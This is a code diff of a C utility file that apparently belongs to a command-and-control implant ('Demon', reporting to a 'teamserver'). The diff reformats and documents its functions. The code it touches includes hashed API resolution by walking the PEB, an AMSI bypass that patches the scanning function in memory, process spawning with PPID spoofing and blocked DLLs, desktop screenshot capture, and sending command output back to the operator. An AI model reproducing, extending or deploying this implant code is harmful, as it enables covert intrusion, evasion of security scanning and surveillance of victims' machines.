@@ -2,81 +2,104 @@
 #include <Core/MiniStd.h>
 #include <Core/Package.h>
 
-#include <Common/Clr.h>
 #include <Common/Macros.h>
-#include <Common/Defines.h>
 
-UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper )
-{
-    if ( ! String )
+/*!
+ * Extended String Hasher
+ * @param String
+ * @param Length
+ * @param Upper
+ * @return
+ */
+ULONG HashEx(
+    IN PVOID String,
+    IN ULONG Length,
+    IN BOOL  Upper
+) {
+    ULONG  Hash = HASH_KEY;
+    PUCHAR Ptr  = String;
+
+    if ( ! String ) {
         return 0;
+    }
 
-    ULONG	Hash = 5381;
-    PUCHAR	Ptr  = String;
-
-    do
-    {
+    do {
         UCHAR character = *Ptr;
 
-        if ( ! Length )
-        {
-            if ( !*Ptr ) break;
-        }
-        else
-        {
-            if ( (ULONG) ( Ptr - (PUCHAR)String ) >= Length ) break;
-            if ( !*Ptr ) ++Ptr;
+        if ( ! Length ) {
+            if ( ! * Ptr ) {
+                break;
+            }
+        } else {
+            if ( ( ULONG ) ( C_PTR( Ptr ) - String ) >= Length ) {
+                break;
+            }
+
+            if ( !*Ptr ) {
+                ++Ptr;
+            }
         }
 
-        if ( Upper )
-        {
-            if ( character >= 'a' )
+        if ( Upper ) {
+            if ( character >= 'a' ) {
                 character -= 0x20;
+            }
         }
-
 
         Hash = ( ( Hash << 5 ) + Hash ) + character;
+
         ++Ptr;
     } while ( TRUE );
 
     return Hash;
 }
 
-PVOID LdrModulePeb( DWORD Hash )
-{
+/*!
+ * load module from PEB InLoadOrderModuleList
+ * @param Hash
+ * @return
+ */
+PVOID LdrModulePeb(
+    IN DWORD Hash
+) {
     PLDR_DATA_TABLE_ENTRY Ldr = NULL;
     PLIST_ENTRY		      Hdr = NULL;
     PLIST_ENTRY		      Ent = NULL;
     PPEB			      Peb = NULL;
 
     /* Get pointer to list */
-    if ( ! Instance.Teb )
+    if ( ! Instance.Teb ) {
         Instance.Teb = NtCurrentTeb();
+    }
+
     Peb = Instance.Teb->ProcessEnvironmentBlock;
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
     Ent = Hdr->Flink;
 
-    for ( ; Hdr != Ent ; Ent = Ent->Flink )
-    {
+    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
         Ldr = C_PTR( Ent );
 
         /* Compare the DLL Name! */
-        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 )
+        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
             return Ldr->DllBase;
+        }
     }
 
     return NULL;
 }
 
-PVOID LdrModuleLoad( LPSTR ModuleName )
-{
+PVOID LdrModuleLoad(
+    IN LPSTR ModuleName
+) {
     UNICODE_STRING UnicodeString  = { 0 };
     WCHAR          MdlName[ 260 ] = { 0 };
     PVOID          Module         = NULL;
     USHORT         DestSize       = 0;
+    NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
-    if ( ! ModuleName )
+    if ( ! ModuleName ) {
         return NULL;
+    }
 
     CharStringToWCharString( MdlName, ModuleName, StringLengthA( ModuleName ) );
 
@@ -87,14 +110,25 @@ PVOID LdrModuleLoad( LPSTR ModuleName )
 
     /* Let's load that Module
      * NOTE: LdrLoadDll needs to be resolved or else we have a problem */
-    if ( NT_SUCCESS( Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) )
-        return Module;
-    else
-        return NULL;
+    if ( Instance.Win32.LdrLoadDll ) {
+        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
+            PRINTF( "LdrLoadDll Failed: %p", NtStatus )
+        }
+    }
+
+    return Module;
 }
 
-PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
-{
+/*!
+ * gets the function pointer
+ * @param Module
+ * @param FunctionHash
+ * @return
+ */
+PVOID LdrFunctionAddr(
+    IN PVOID Module,
+    IN DWORD Hash
+) {
     PIMAGE_NT_HEADERS       NtHeader         = NULL;
     PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
     SIZE_T                  ExpDirectorySize = 0;
@@ -116,11 +150,11 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
     for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
     {
         FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
-        if ( HashStringA( FunctionName ) == FunctionHash )
+        if ( HashEx( FunctionName, 0, TRUE ) == Hash )
         {
             FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
 
-            // if this is a redirect function then use LdrGetProcedureAddress
+            /* if this is a redirect function then use LdrGetProcedureAddress */
             if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
                  ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
             {
@@ -128,8 +162,7 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
                 AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                 AnsiString.Buffer        = FunctionName;
 
-                if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) )
-                {
+                if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) ) {
                     return NULL;
                 }
             }
@@ -138,105 +171,87 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
         }
     }
 
-    PRINTF( "API not found: FunctionHash:[%lx]\n", FunctionHash )
+    PRINTF( "API not found: FunctionHash:[%lx]\n", Hash )
 
     return NULL;
 }
 
-
-PCHAR TokenGetUserDomain( HANDLE hToken, PUINT32 UserSize )
-{
-    LPVOID       TokenUserInfo        = NULL;
-    CHAR         UserName[ MAX_PATH ] = { 0 };
-    CHAR         Domain[ MAX_PATH ]   = { 0 };
-    PCHAR        UserDomain           = NULL;
-    SID_NAME_USE SidType              = 0;
-    DWORD        dwLength             = 0;
-    DWORD        DomainSize           = MAX_PATH;
-    DWORD        UserNameSize         = MAX_PATH;
-    CHAR         Deli[ 2 ]            = { '\\', 0 };
-
-    /* if we got an invalid token just exit */
-    if ( ! hToken )
-        return NULL;
-
-    MemSet( UserName, 0, MAX_PATH );
-    MemSet( Domain,   0, MAX_PATH );
-
-    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, 0, &dwLength ) )
-    {
-        // most likely error: ERROR_INSUFFICIENT_BUFFER
-        if ( ( TokenUserInfo = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
-        {
-            if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, TokenUserInfo, dwLength, &dwLength ) )
-            {
-                PRINTF( "[!] Couldn't get Token Information: %d\n", NtGetLastError() )
-                return NULL;
-            }
-        }
-    }
-
-    if ( ! Instance.Win32.LookupAccountSidA( NULL, ( ( PTOKEN_USER ) TokenUserInfo )->User.Sid, UserName, &UserNameSize, Domain, &DomainSize, &SidType ) )
-    {
-        PRINTF( "[%s] LookupAccountSidA failed: %d\n", __FUNCTION__, NtGetLastError() );
-        CALLBACK_GETLASTERROR
-        return NULL;
-    }
-
-    *UserSize  = UserNameSize + 2 + DomainSize;
-    UserDomain = Instance.Win32.LocalAlloc( LPTR, *UserSize );
-
-    StringConcatA( UserDomain, Domain );
-    StringConcatA( UserDomain, Deli );
-    StringConcatA( UserDomain, UserName );
-
-    MemSet( Domain, 0, MAX_PATH );
-    MemSet( UserName, 0, MAX_PATH );
-
-    return UserDomain;
-}
-
-HANDLE ProcessOpen( DWORD ProcessID, DWORD Access )
-{
-    HANDLE            hProcess    = NULL;
-    CLIENT_ID         ClientID    = { (HANDLE)ProcessID, 0 };
-    OBJECT_ATTRIBUTES ObjectAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
-    NTSTATUS          NtStatus    = STATUS_SUCCESS;
-
-    NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, Access, &ObjectAttr, &ClientID );
-    if ( NT_SUCCESS( NtStatus ) )
-    {
-        return hProcess;
-    }
-
-    NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-
-    return NULL;
-}
-
-BOOL ProcessIsWow( HANDLE hProcess )
-{
-    ULONG_PTR IsWow64  = 0;
+/*!
+ * opens a handle to the specified pid with specified access
+ * @param ProcessID
+ * @param Access
+ * @return
+ */
+HANDLE ProcessOpen(
+    IN DWORD Pid,
+    IN DWORD Access
+) {
+    HANDLE    Process  = INVALID_HANDLE_VALUE;
+    CLIENT_ID Client   = { 0 };
+    OBJ_ATTR  ObjAttr  = { 0 };
     NTSTATUS  NtStatus = STATUS_SUCCESS;
 
-    if ( ! hProcess )
-        return FALSE;
+    /* set our target process */
+    Client.UniqueProcess = C_PTR( Pid );
 
-    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessWow64Information, &IsWow64, sizeof( ULONG_PTR ), NULL ) ) )
-    {
-        PRINTF( "[!] NtQueryInformationProcess Failed: Handle[%x] Status[%lx] DosError[%lx]\n", hProcess, NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+    /* open process handle */
+    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &Process, Access, &ObjAttr, &Client ) ) ) {
+        PRINTF( "NtOpenProcess Failed => %lx\n", NtStatus )
+        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+    }
+
+    return Process;
+}
+
+/*!
+ * checks if a process runs under Wow64
+ * @param Process
+ * @return
+ */
+BOOL ProcessIsWow(
+    IN HANDLE Process
+) {
+    PVOID    IsWow64  = NULL;
+    NTSTATUS NtStatus = STATUS_SUCCESS;
+
+    if ( ! Process ) {
         return FALSE;
     }
 
-    return ( IsWow64 != 0 );
+    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationProcess( Process, ProcessWow64Information, &IsWow64, sizeof( PVOID ), NULL ) ) ) {
+        PRINTF( "[!] NtQueryInformationProcess Failed: Handle[%x] Status[%lx]\n", Process, NtStatus )
+        IsWow64 = FALSE;
+    }
+
+    return U_PTR( IsWow64 );
 }
 
-BOOL ProcessCreate( BOOL EnableWow64, LPWSTR App, LPWSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE DataAnonPipes )
-{
-    PPACKAGE        Package         = NULL;
-    PANONPIPE       AnonPipe        = { 0 };
-    STARTUPINFOW    StartUpInfo     = { 0 };
-    BOOL            Return          = TRUE;
+/*!
+ * Starts a Process
+ *
+ * @param x86 start 32-bit/wow64 process
+ * @param App App path
+ * @param CmdLine Process to run
+ * @param Flags Process Flags
+ * @param ProcessInfo Process Information struct
+ * @param Piped Send output back
+ * @param AnonPipes Uses Anon pipe struct as default pipe. only works if Piped is to False
+ * @brief Spawns a process with current set settings (ppid spoof, blockdll, token)
+ * @return
+ */
+BOOL ProcessCreate(
+    IN  BOOL                 x86,
+    IN  LPWSTR               App,
+    IN  LPWSTR               CmdLine,
+    IN  DWORD                Flags,
+    OUT PROCESS_INFORMATION* ProcessInfo,
+    IN  BOOL                 Piped,
+    IN  PANONPIPE            DataAnonPipes
+) {
+    PPACKAGE        Package     = NULL;
+    PANONPIPE       AnonPipe    = { 0 };
+    STARTUPINFOW    StartUpInfo = { 0 };
+    BOOL            Return      = TRUE;
 
     StartUpInfo.cb          = sizeof( STARTUPINFOA );
     StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -257,8 +272,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPWSTR App, LPWSTR CmdLine, DWORD Flags, P
         StartUpInfo.hStdInput  = NULL;
     }
 
-    if ( DataAnonPipes )
-    {
+    if ( DataAnonPipes ) {
         PUTS( "Using specified anon pipes" )
         StartUpInfo.hStdError  = DataAnonPipes->StdOutWrite;
         StartUpInfo.hStdOutput = DataAnonPipes->StdOutWrite;
@@ -286,8 +300,9 @@ BOOL ProcessCreate( BOOL EnableWow64, LPWSTR App, LPWSTR CmdLine, DWORD Flags, P
         LPWSTR lpCurrentDirectory   = NULL;
         WCHAR  Path[ MAX_PATH * 2 ] = { 0 };
 
-        if ( Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) )
+        if ( Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) {
             lpCurrentDirectory = Path;
+        }
 
         TokenImpersonate(FALSE);
         TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
@@ -423,40 +438,45 @@ BOOL ProcessCreate( BOOL EnableWow64, LPWSTR App, LPWSTR CmdLine, DWORD Flags, P
         JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
 
 Cleanup:
-
     return Return;
 }
 
-NTSTATUS ProcessSnapShot( PSYSTEM_PROCESS_INFORMATION* Buffer, PSIZE_T Size )
-{
+/*!
+ * takes a snapshot of current running processes
+ * @param SnapShot
+ * @param Size
+ * @return
+ */
+NTSTATUS ProcessSnapShot(
+    OUT PSYSTEM_PROCESS_INFORMATION* SnapShot,
+    OUT PSIZE_T                      Size
+) {
     ULONG    Length   = 0;
     NTSTATUS NtStatus = STATUS_SUCCESS;
+
+    if ( ! SnapShot || ! Size ) {
+        return STATUS_INVALID_PARAMETER;
+    }
 
     /* Get our system process list */
     if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &Length ) ) )
     {
-        PRINTF( "SystemProcessInformation Length: %d\n", Length )
+        PRINTF( "SystemProcessInformation Length: %d\n", Length );
 
         /* just in case that some processes or threads where created between our calls */
         Length += 0x1000;
 
         /* allocate memory */
-        *Buffer = NtHeapAlloc( Length );
-        if ( *Buffer )
-        {
-            if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, *Buffer, Length, &Length ) ) )
-            {
-                PRINTF( "SystemProcessInformation Length: %d\n", Length )
-            }
-            else
-            {
-                PRINTF( "NtQuerySystemInformation Failed: Status[%lx] DosError[%lx]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
+        *SnapShot = NtHeapAlloc( Length );
+        if ( *SnapShot ) {
+            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, *SnapShot, Length, &Length ) ) ) {
+                PRINTF( "NtQuerySystemInformation Failed: Status[%lx]\n", NtStatus )
                 goto LEAVE;
             }
-        }
-    }
-    else
-    {
+        } else NtStatus = STATUS_NO_MEMORY;
+
+        *Size = Length;
+    } else {
         /* we expected to fail. something doesn't seem right... */
         NtStatus = STATUS_INVALID_PARAMETER;
     }
@@ -465,35 +485,35 @@ LEAVE:
     return NtStatus;
 }
 
-BOOL ReadLocalFile( LPCWSTR FileName, PVOID* FileContent, PDWORD FileSize )
-{
+BOOL ReadLocalFile(
+    IN  LPCWSTR FileName,
+    OUT PVOID*  FileContent,
+    OUT PDWORD  FileSize
+) {
     BOOL   Success = FALSE;
     DWORD  Read    = 0;
     HANDLE hFile   = NULL;
 
     hFile = Instance.Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
-    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
-    {
+    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) ) {
         PUTS( "CreateFileW: Failed" )
-        CALLBACK_GETLASTERROR
+        PACKAGE_ERROR_WIN32
         goto Cleanup;
     }
 
     *FileSize    = Instance.Win32.GetFileSize( hFile, 0 );
     *FileContent = Instance.Win32.LocalAlloc( LPTR, *FileSize );
 
-    if ( ! Instance.Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) )
-    {
+    if ( ! Instance.Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) ) {
         PUTS( "ReadFile: Failed" )
-        CALLBACK_GETLASTERROR
+        PACKAGE_ERROR_WIN32
         goto Cleanup;
     }
 
     Success = TRUE;
 
 Cleanup:
-    if ( hFile )
-    {
+    if ( hFile ) {
         Instance.Win32.NtClose( hFile );
         hFile = NULL;
     }
@@ -510,8 +530,9 @@ Cleanup:
 
 /* Patch AMSI
  * TODO: remove this and replace it with hardware breakpoints */
-BOOL BypassPatchAMSI()
-{
+BOOL BypassPatchAMSI(
+    VOID
+) {
     HINSTANCE hModuleAmsi   = NULL;
     LPVOID pAddress         = NULL;
     CHAR module[10]         = { 0 };
@@ -543,16 +564,15 @@ BOOL BypassPatchAMSI()
     PRINTF("[+] asmi function: %p\n", pAddress);
 
     LPVOID lpBaseAddress = pAddress;
-    ULONG OldProtection, NewProtection;
+    ULONG  OldProtection, NewProtection;
     SIZE_T uSize = sizeof(amsiPatch);
 
-    PUTS("NtProtectVirtualMemory")
-    if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) )
-    {
+    if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) ) {
         MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );
 
-        if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) )
+        if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) ) {
             return TRUE;
+        }
 
         PUTS( "[-] Failed to change back protection" )
     }
@@ -560,23 +580,29 @@ BOOL BypassPatchAMSI()
     return FALSE;
 }
 
-BOOL AnonPipesInit( PANONPIPE AnonPipes )
-{
+BOOL AnonPipesInit(
+    IN PANONPIPE AnonPipes
+) {
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
-    if ( ! Instance.Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) )
-        goto HandleError;
+    if ( ! Instance.Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) ) {
+        PACKAGE_ERROR_WIN32
+        return FALSE;
+    }
 
     return TRUE;
-
-HandleError:
-    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-
-    return FALSE;
 }
 
-VOID AnonPipesRead( PANONPIPE AnonPipes, UINT32 RequestID )
-{
+/*!
+ * reads from the specified anonymous pipe and
+ * sends the result back to the teamserver
+ * @param AnonPipes
+ * @param RequestID
+ */
+VOID AnonPipesRead(
+    IN PANONPIPE AnonPipes,
+    IN UINT32 RequestID
+) {
     PPACKAGE Package         = NULL;
     BOOL     Success         = FALSE;
     LPVOID   Buffer          = NULL;
@@ -587,35 +613,30 @@ VOID AnonPipesRead( PANONPIPE AnonPipes, UINT32 RequestID )
     PUTS( "Start reading anon pipe" )
     PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )
 
-    if ( AnonPipes->StdOutWrite )
-    {
+    if ( AnonPipes->StdOutWrite ) {
         Instance.Win32.NtClose( AnonPipes->StdOutWrite );
         AnonPipes->StdOutWrite = NULL;
     }
 
     Buffer = Instance.Win32.LocalAlloc( LPTR, 0 );
-    do
-    {
+
+    do {
         Success = Instance.Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
         PRINTF( "dwRead => %d\n", dwRead )
 
-        if ( dwRead == 0 )
+        if ( dwRead == 0 ) {
             break;
+        }
 
         dwBufferSize += dwRead;
 
-        Buffer = Instance.Win32.LocalReAlloc(
-                Buffer,
-                dwBufferSize,
-                LMEM_MOVEABLE);
+        Buffer = Instance.Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
 
         MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
         MemSet( buf, 0, dwRead );
-
     } while ( Success == TRUE );
 
-    if ( dwBufferSize )
-    {
+    if ( dwBufferSize ) {
         Package = PackageCreateWithRequestID( RequestID, DEMON_OUTPUT );
         PackageAddBytes( Package, Buffer, dwBufferSize );
         PackageTransmit( Package, NULL, NULL );
@@ -624,23 +645,16 @@ VOID AnonPipesRead( PANONPIPE AnonPipes, UINT32 RequestID )
     DATA_FREE( Buffer, dwBufferSize );
 }
 
-VOID AnonPipesClose( PANONPIPE AnonPipes )
-{
-    if ( AnonPipes->StdOutRead )
-    {
-        Instance.Win32.NtClose( AnonPipes->StdOutRead );
-        AnonPipes->StdOutRead = NULL;
-    }
-
-    if ( AnonPipes->StdOutWrite )
-    {
-        Instance.Win32.NtClose( AnonPipes->StdOutWrite );
-        AnonPipes->StdOutWrite = NULL;
-    }
-}
-
-BOOL WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize )
-{
+/*!
+ * takes a BMP screenshot of the current desktop
+ * @param ImagePointer
+ * @param ImageSize
+ * @return
+ */
+BOOL WinScreenshot(
+    OUT PVOID*  ImagePointer,
+    OUT PSIZE_T ImageSize
+) {
     BITMAPFILEHEADER    BitFileHdr  = { 0 };
     BITMAPINFOHEADER    BitInfoHdr  = { 0 };
     BITMAPINFO          BitMapInfo  = { 0 };
@@ -699,17 +713,21 @@ BOOL WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize )
     if ( ImageSize )
         *ImageSize = BitMapSize;
 
-    if ( hTempMap )
+    if ( hTempMap ) {
         Instance.Win32.DeleteObject( hTempMap );
+    }
 
-    if ( hMemDC )
+    if ( hMemDC ) {
         Instance.Win32.DeleteDC( hMemDC );
+    }
 
-    if ( hDC )
+    if ( hDC ) {
         Instance.Win32.ReleaseDC( NULL, hDC );
+    }
 
-    if ( hBitmap )
+    if ( hBitmap ) {
         Instance.Win32.DeleteObject( hBitmap );
+    }
 
     return TRUE;
 }
@@ -720,17 +738,16 @@ BOOL WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize )
  * @param Buffer buffer to save the read bytes from the pipe
  * @return pipe read successful or not
  */
-BOOL PipeRead( HANDLE Handle, PBUFFER Buffer )
-{
+BOOL PipeRead(
+    IN HANDLE  Handle,
+    IN PBUFFER Buffer
+) {
     DWORD Read  = 0;
     DWORD Total = 0;
 
-    do
-    {
-        if ( ! Instance.Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) )
-        {
-            if ( NtGetLastError() != ERROR_MORE_DATA )
-            {
+    do {
+        if ( ! Instance.Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) ) {
+            if ( NtGetLastError() != ERROR_MORE_DATA ) {
                 PRINTF( "ReadFile failed with %d\n", NtGetLastError() )
                 return FALSE;
             }
@@ -748,15 +765,17 @@ BOOL PipeRead( HANDLE Handle, PBUFFER Buffer )
  * @param Buffer buffer to write
  * @return pipe write successful or not
  */
-BOOL PipeWrite( HANDLE Handle, PBUFFER Buffer )
-{
+BOOL PipeWrite(
+    IN HANDLE   Handle,
+    OUT PBUFFER Buffer
+) {
     DWORD Written = 0;
     DWORD Total   = 0;
 
-    do
-    {
-        if ( ! Instance.Win32.WriteFile( Handle, Buffer->Buffer + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL ) )
+    do {
+        if ( ! Instance.Win32.WriteFile( Handle, Buffer->Buffer + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL ) ) {
             return FALSE;
+        }
 
         Total += Written;
     } while ( Total < Buffer->Length );
@@ -764,8 +783,13 @@ BOOL PipeWrite( HANDLE Handle, PBUFFER Buffer )
     return TRUE;
 }
 
-ULONG RandomNumber32( VOID )
-{
+/*!
+ * generates a random unsigned 32-bit integer
+ * @return
+ */
+ULONG RandomNumber32(
+    VOID
+) {
     ULONG Seed = 0;
 
     Seed = Instance.Win32.GetTickCount();
@@ -776,8 +800,13 @@ ULONG RandomNumber32( VOID )
     return Seed % 2 == 0 ? Seed : Seed + 1;
 }
 
-BOOL RandomBool( VOID )
-{
+/*!
+ * generates a random bool
+ * @return
+ */
+BOOL RandomBool(
+    VOID
+) {
     ULONG Seed = 0;
 
     Seed = Instance.Win32.GetTickCount();
@@ -785,3 +814,7 @@ BOOL RandomBool( VOID )
 
     return Seed % 2 == 0 ? TRUE : FALSE;
 }
+
+VOID volatile ___chkstk_ms(
+    VOID
+) { __asm__( "nop" ); }
